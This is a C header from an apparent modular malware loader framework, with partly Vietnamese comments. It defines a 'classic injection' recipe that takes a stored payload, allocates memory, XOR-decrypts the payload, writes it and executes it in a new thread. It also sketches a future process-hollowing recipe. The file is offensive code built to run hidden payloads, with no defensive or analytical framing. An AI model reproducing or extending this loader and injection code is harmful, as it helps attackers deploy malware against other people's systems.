#pragma once

// Import các mảnh ghép
#include "1_storage/storage_data.h"
#include "2_allocation/alloc_local.h"
#include "3_transformation/crypto_xor.h"
#include "4_writing/write_local.h"
#include "5_execution/exec_thread.h"
// #include "5_execution/exec_apc.h" // Ví dụ mở rộng

// ====================================================
// RECIPE 1: CLASSIC INJECTION
// Flow: Storage -> Alloc(Local) -> Decrypt(XOR) -> Write(Local) -> Exec(Thread)
// ====================================================
void Recipe_Classic_Injection() {
    
    // Stage 1: Get Payload
    PayloadContext ctx = Stage1_Storage_GetData();

    // Stage 2: Allocation
    ctx.allocated_mem = (unsigned char*)Stage2_Alloc_Local(ctx.length);
    if (!ctx.allocated_mem) return;

    // Stage 3: Transformation (Decrypt)
    #ifdef ENCRYPTION_XOR
        Stage3_Transform_XOR(&ctx);
    #endif

    // Stage 4: Writing
    Stage4_Write_Local(ctx.allocated_mem, ctx.data, ctx.length);

    // Stage 5: Execution
    Stage5_Exec_LocalThread(ctx.allocated_mem);
}

// ====================================================
// RECIPE 2: PROCESS HOLLOWING (Ví dụ tương lai)
// Flow: Storage -> CreateSuspended -> Unmap -> Alloc(Remote) -> Write(Remote) -> Hijack -> Resume
// ====================================================
// void Recipe_Process_Hollowing() { ... }